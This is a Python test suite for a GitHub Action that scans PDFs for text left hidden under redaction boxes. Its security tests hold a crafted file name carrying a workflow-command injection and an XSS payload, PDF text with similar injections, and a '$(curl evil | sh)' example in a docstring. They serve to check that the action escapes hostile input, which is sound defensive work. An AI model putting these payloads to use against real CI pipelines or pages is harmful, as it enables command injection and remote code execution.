"""Tests for the NilPDF GitHub Action: action.yml and the scripts in action/.

The check step runs against the package built from this checkout, exactly as
the action installs it, on generated PDFs. Its stdout is read the way the
Actions runner reads it, so the tests see which lines would act as workflow
commands. The "GitHub Action" CI job runs action.yml itself end to end.
"""
import json
import os
import re
import shutil
import subprocess
import sys
import tempfile
import unittest

import yaml

sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))

from test_engine import SECRET, box, make_encrypted_pdf, make_line_pdf  # noqa: E402
from test_package import BASE, PackageTestCase, read, source_version  # noqa: E402

ACTION = yaml.safe_load(read("action.yml"))
CHECK = os.path.join(BASE, "action", "check.py")
INSTALL = os.path.join(BASE, "action", "install.sh")
# Newlines and commas in a file name: legal on Linux, and exactly what a
# crafted name would use to break out of a log line or an annotation. It can't
# come through the paths input, which is one path per line, but it can come
# from a directory in a pull request that the workflow checks.
EVIL_NAME = "evil\n::error::pwned,title=x:y%<img src=x onerror=alert(1)>.pdf"
LOG_LINE = re.compile(r"^(::stop-commands::[0-9a-f]{32}|::[0-9a-f]{32}::|::(error|warning) [^\n]*"
                      r"|(OK|HIDDEN|ERROR) +\S.*|  page \d+, .*)$")


def unescape(value):
    for code, ch in (("%0D", "\r"), ("%0A", "\n"), ("%3A", ":"), ("%2C", ","), ("%25", "%")):
        value = value.replace(code, ch)
    return value


def workflow_commands(stdout):
    """The workflow commands in some output, read as the runner reads them:
    any line that starts with :: after leading whitespace, except between
    ::stop-commands::TOKEN and ::TOKEN::. Returns (name, properties, message)."""
    found, stopped_until = [], None
    for line in stdout.splitlines():
        s = line.lstrip()
        if stopped_until:
            if s == f"::{stopped_until}::":
                stopped_until = None
            continue
        m = re.match(r"^::([A-Za-z-]+)(?: ([^:]*))?::(.*)$", s)
        if not m:
            continue
        name, props, message = m.groups()
        if name == "stop-commands":
            stopped_until = message
            continue
        pairs = dict(p.split("=", 1) for p in props.split(",")) if props else {}
        found.append((name, {k: unescape(v) for k, v in pairs.items()}, unescape(message)))
    return found


class TestActionMetadata(unittest.TestCase):
    def test_marketplace_fields(self):
        self.assertEqual(ACTION["name"], "NilPDF Check PDF Redactions")
        self.assertLessEqual(len(ACTION["description"]), 125, "GitHub Marketplace's limit")
        self.assertEqual(set(ACTION["branding"]), {"icon", "color"})

    def test_it_is_a_composite_action_running_the_scripts_in_action(self):
        self.assertEqual(ACTION["runs"]["using"], "composite")
        runs = " ".join(s["run"] for s in ACTION["runs"]["steps"])
        self.assertIn("action/install.sh", runs)
        self.assertIn("action/check.py", runs)
        for step in ACTION["runs"]["steps"]:
            self.assertEqual(step.get("shell"), "bash", step["name"])

    def test_no_expression_is_written_into_a_script(self):
        """${{ inputs.paths }} inside run: is pasted into the shell script before
        it runs, so a path like `$(curl evil | sh)` would execute. Inputs go
        through env: instead, where they stay data."""
        for step in ACTION["runs"]["steps"]:
            with self.subTest(step=step["name"]):
                self.assertNotIn("${{", step["run"])

    def test_every_input_reaches_the_check_step(self):
        env = next(s for s in ACTION["runs"]["steps"] if s.get("id") == "check")["env"]
        for name in ACTION["inputs"]:
            with self.subTest(input=name):
                var = "NILPDF_" + name.upper().replace("-", "_")
                self.assertEqual(env.get(var), f"${{{{ inputs.{name} }}}}")

    def test_outputs_come_from_the_check_step(self):
        for name, spec in ACTION["outputs"].items():
            with self.subTest(output=name):
                self.assertEqual(spec["value"], f"${{{{ steps.check.outputs.{name} }}}}")

    def test_defaults_are_the_safe_choices(self):
        inputs = ACTION["inputs"]
        self.assertEqual(inputs["fail-on-hidden-text"]["default"], "true")
        self.assertEqual(inputs["fail-on-error"]["default"], "true")
        self.assertEqual(inputs["show-text"]["default"], "false", "the hidden text is the leak; keep it out of logs")

    def test_install_never_runs_python_from_the_workspace(self):
        """`python -m` puts the current directory first on the module path. The
        workspace may be an untrusted pull request, so every -m runs isolated
        (-I), after the script has moved into its own temporary directory."""
        script = read("action/install.sh")
        cd = script.index('cd "$venv"')
        for m in re.finditer(r"-m (venv|pip)", script):
            with self.subTest(module=m.group(1)):
                self.assertGreater(m.start(), cd)
                self.assertEqual(script[m.start() - 3:m.start()], "-I ")

    def test_install_pins_what_this_release_was_tested_with(self):
        script = read("action/install.sh")
        self.assertIn("grep -E '^(pypdf|hatchling)==' \"$action_dir/requirements.txt\"", script)
        self.assertIn("--no-build-isolation", script)
        for pkg in ("pypdf", "hatchling"):
            self.assertRegex(read("requirements.txt"), rf"(?m)^{pkg}==\S+$")


class TestDocumentation(unittest.TestCase):
    """People copy these examples as they are, so they must name the current
    release and only inputs the action has."""

    DOCS = ("README.md", "python/README.md")

    def examples(self, doc):
        for block in re.findall(r"```yaml\n(.*?)```", read(doc), re.S):
            if "kdigitalsystems/nilpdf@" in block:
                yield block

    def test_examples_pin_the_current_release(self):
        for doc in self.DOCS:
            with self.subTest(doc=doc):
                tags = re.findall(r"kdigitalsystems/nilpdf@([\w.<>-]+)", read(doc))
                self.assertTrue(tags)
                for tag in tags:
                    self.assertIn(tag, (f"v{source_version()}", "<commit-sha>"))

    def test_examples_are_valid_and_use_real_inputs(self):
        for doc in self.DOCS:
            for block in self.examples(doc):
                with self.subTest(doc=doc, block=block[:40]):
                    parsed = yaml.safe_load(block)
                    steps = (parsed["jobs"]["redactions"]["steps"] if isinstance(parsed, dict) and "jobs" in parsed
                             else parsed["steps"] if isinstance(parsed, dict) else parsed)
                    uses = [s for s in steps if str(s.get("uses", "")).startswith("kdigitalsystems/nilpdf@")]
                    self.assertTrue(uses)
                    for step in uses:
                        self.assertLessEqual(set(step.get("with", {})), set(ACTION["inputs"]))

    def test_every_input_and_output_is_documented(self):
        readme = read("README.md")
        for name in list(ACTION["inputs"]) + ["hidden-text-found", "files-checked", "report"]:
            with self.subTest(name=name):
                self.assertIn(f"`{name}`", readme)


class TestInstallScript(unittest.TestCase):
    def test_missing_python_is_a_clear_error(self):
        """A runner without Python 3.10+ gets one actionable message, not a
        traceback. A stand-in python3 that reports an old version is the only
        Python on PATH."""
        tmp = tempfile.mkdtemp()
        self.addCleanup(shutil.rmtree, tmp, ignore_errors=True)
        fake = os.path.join(tmp, "python3")
        with open(fake, "w") as f:
            f.write("#!/bin/sh\nexit 1\n")
        os.chmod(fake, 0o755)
        r = subprocess.run([shutil.which("bash"), INSTALL], capture_output=True, text=True, timeout=30,
                           env={"PATH": tmp, "GITHUB_ACTION_PATH": BASE, "RUNNER_TEMP": tmp})
        self.assertEqual(r.returncode, 1, r.stdout + r.stderr)
        self.assertIn("::error title=NilPDF needs Python::Python 3.10 or newer was not found", r.stdout)
        self.assertIn("actions/setup-python", r.stdout)


class ActionTestCase(PackageTestCase):
    """Runs action/check.py with the package built from this checkout."""

    def setUp(self):
        self.gh = tempfile.mkdtemp(prefix="nilpdf-gh-")
        self.addCleanup(shutil.rmtree, self.gh, ignore_errors=True)

    def run_check(self, paths, **inputs):
        output = os.path.join(self.gh, "output")
        summary = os.path.join(self.gh, "summary")
        for path in (output, summary):
            open(path, "w").close()
        env = {
            **self.env,
            "GITHUB_OUTPUT": output, "GITHUB_STEP_SUMMARY": summary,
            "GITHUB_WORKSPACE": self.fx, "RUNNER_TEMP": self.gh,
            "NILPDF_PATHS": paths,
            "NILPDF_PASSWORD": inputs.get("password", ""),
            "NILPDF_FAIL_ON_HIDDEN_TEXT": inputs.get("fail_on_hidden_text", "true"),
            "NILPDF_FAIL_ON_ERROR": inputs.get("fail_on_error", "true"),
            "NILPDF_SHOW_TEXT": inputs.get("show_text", "false"),
        }
        r = subprocess.run([sys.executable, CHECK], cwd=self.fx, env=env, capture_output=True, timeout=120)
        with open(output, encoding="utf-8") as f:
            outputs = dict(line.split("=", 1) for line in f.read().splitlines())
        with open(summary, encoding="utf-8") as f:
            r.summary = f.read()
        r.outputs = outputs
        r.log = r.stdout.decode("utf-8")
        r.commands = workflow_commands(r.log)
        r.report = None
        if outputs.get("report"):
            with open(outputs["report"], encoding="utf-8") as f:
                r.report = json.load(f)
        return r


class TestCheckStep(ActionTestCase):
    def test_a_clean_file_passes(self):
        r = self.run_check("clean.pdf")
        self.assertEqual(r.returncode, 0, r.log)
        self.assertEqual(r.outputs, {"hidden-text-found": "false", "files-checked": "1",
                                     "files-with-hidden-text": "0", "files-with-errors": "0",
                                     "report": r.outputs["report"]})
        self.assertEqual(r.commands, [])
        self.assertRegex(r.log, r"\nOK      clean\.pdf: no hidden text \(\d+ pages?\)\n")
        self.assertIn("**No hidden text in 1 file.**", r.summary)

    def test_hidden_text_fails_without_repeating_the_text(self):
        r = self.run_check("hidden.pdf")
        self.assertEqual(r.returncode, 1, r.log)
        self.assertEqual(r.outputs["hidden-text-found"], "true")
        self.assertEqual(r.outputs["files-with-hidden-text"], "1")
        [(name, props, message)] = r.commands
        self.assertEqual((name, props), ("error", {"title": "Hidden text in PDF", "file": "hidden.pdf"}))
        self.assertRegex(message, r"^Hidden text in 1 place: page 1, hidden under a box: \d+ characters$")
        self.assertIn("HIDDEN  hidden.pdf: hidden text in 1 place", r.log)
        for where, text in (("log", r.log), ("summary", r.summary), ("annotation", message)):
            with self.subTest(where=where):
                self.assertNotIn(SECRET, text)
        self.assertIn("show-text: true", r.summary)
        self.assertIn("https://nilpdf.com/check-pdf-redaction/", r.summary)
        # The report on the runner keeps everything, for whoever has to fix the file.
        self.assertIn(SECRET, r.report["files"][0]["findings"][0]["text"])

    def test_show_text_includes_it_everywhere(self):
        r = self.run_check("hidden.pdf", show_text="true")
        self.assertEqual(r.returncode, 1)
        for where, text in (("log", r.log), ("summary", r.summary), ("annotation", r.commands[0][2])):
            with self.subTest(where=where):
                self.assertIn(SECRET, text)

    def test_report_only_mode_warns_and_passes(self):
        r = self.run_check("hidden.pdf", fail_on_hidden_text="false")
        self.assertEqual(r.returncode, 0, r.log)
        self.assertEqual(r.outputs["hidden-text-found"], "true")
        self.assertEqual([c[0] for c in r.commands], ["warning"])

    def test_directories_and_globs_are_expanded_once_each(self):
        r = self.run_check("tree\n**/*.pdf\ntree/sub/*.PDF")
        checked = [f["path"] for f in r.report["files"]]
        self.assertEqual(len(checked), len(set(checked)), checked)
        self.assertEqual(sorted(checked), sorted(["tree/a_clean.pdf", "tree/sub/b_whiteout.PDF",
                                                  "clean.pdf", "hidden.pdf"]))
        self.assertEqual(r.outputs["files-checked"], "4")
        self.assertEqual(r.outputs["files-with-hidden-text"], "2")
        self.assertEqual(r.returncode, 1)

    def test_a_glob_matching_nothing_is_reported_not_skipped(self):
        r = self.run_check("missing/**/*.pdf")
        self.assertEqual(r.returncode, 1, r.log)
        self.assertEqual(r.outputs["files-with-errors"], "1")
        self.assertIn("ERROR   missing/**/*.pdf: cannot read file", r.log)
        self.assertEqual(self.run_check("missing/**/*.pdf", fail_on_error="false").returncode, 0)

    def test_a_directory_without_pdfs_fails_by_default(self):
        os.makedirs(os.path.join(self.fx, "empty"), exist_ok=True)
        r = self.run_check("empty")
        self.assertEqual(r.returncode, 1, r.log)
        self.assertEqual(r.outputs["files-checked"], "0")
        [(name, props, message)] = r.commands
        self.assertEqual((name, props.get("title")), ("error", "PDF could not be checked"))
        self.assertEqual(message, "empty: no PDF files found")

    def test_non_pdfs_and_hidden_text_are_both_reported(self):
        r = self.run_check("notes.txt\nhidden.pdf", fail_on_hidden_text="false")
        self.assertEqual(r.returncode, 1, "the unreadable file still fails the step")
        self.assertEqual(sorted(c[1]["title"] for c in r.commands), ["Hidden text in PDF", "PDF could not be checked"])
        self.assertIn("ERROR   notes.txt: not a PDF file", r.log)

    def test_empty_paths_check_nothing_and_pass(self):
        r = self.run_check("  \n\n")
        self.assertEqual(r.returncode, 0, r.log)
        self.assertEqual(r.outputs["files-checked"], "0")
        self.assertEqual(r.outputs["report"], "")
        self.assertEqual(r.summary, "")

    def test_invalid_flags_are_rejected(self):
        r = self.run_check("clean.pdf", fail_on_error="ture")
        self.assertEqual(r.returncode, 2)
        [(name, props, message)] = r.commands
        self.assertEqual(name, "error")
        self.assertEqual(message, "fail-on-error must be true or false, not 'ture'")

    def test_encrypted_pdfs_use_the_password(self):
        self.write("locked.pdf", make_encrypted_pdf(password="pw"))
        self.assertEqual(self.run_check("locked.pdf", password="pw").returncode, 0)
        r = self.run_check("locked.pdf")
        self.assertEqual(r.returncode, 1)
        self.assertIn("wrong or missing password", r.log)

    def test_absolute_paths_are_annotated_relative_to_the_repository(self):
        r = self.run_check(os.path.join(self.fx, "hidden.pdf"))
        self.assertEqual(r.commands[0][1]["file"], "hidden.pdf")


class TestUntrustedContent(ActionTestCase):
    """A pull request controls file names and what the PDFs contain. Neither
    may add workflow commands, change an annotation's properties, or put HTML
    in the job summary."""

    def setUp(self):
        super().setUp()
        hostile_text = "::warning::pwned <img src=x onerror=alert(1)> | ` * [x](javascript:alert(1))"
        os.makedirs(os.path.join(self.fx, "untrusted"), exist_ok=True)
        self.write(os.path.join("untrusted", EVIL_NAME), make_line_pdf(draw=box(0, 0, 0), text=hostile_text))
        self.addCleanup(shutil.rmtree, os.path.join(self.fx, "untrusted"), ignore_errors=True)

    def test_only_the_actions_own_annotations_are_commands(self):
        for show_text in ("false", "true"):
            with self.subTest(show_text=show_text):
                r = self.run_check("untrusted", show_text=show_text)
                self.assertEqual(r.outputs["files-with-hidden-text"], "1", r.log)
                self.assertEqual(len(r.commands), 1, r.commands)
                name, props, message = r.commands[0]
                self.assertEqual(name, "error")
                self.assertEqual(set(props), {"title", "file"})
                self.assertEqual(props["title"], "Hidden text in PDF")
                self.assertNotIn("\n", props["file"])
                self.assertTrue(props["file"].startswith("untrusted/evil\\x0a::error::pwned,title=x:y%"), props)
                # No newline got through: every line of the log is one of the action's own.
                for line in r.log.splitlines():
                    self.assertRegex(line, LOG_LINE)

    def test_the_summary_is_escaped(self):
        r = self.run_check("untrusted", show_text="true")
        self.assertNotIn("<img", r.summary)
        self.assertIn("&lt;img src=x onerror=alert(1)&gt;", r.summary)
        table = r.summary[r.summary.index("<table>"):r.summary.index("</table>")]
        self.assertNotIn("\n\n", table, "a blank line would end the HTML block and turn the rest into Markdown")


if __name__ == "__main__":
    unittest.main()
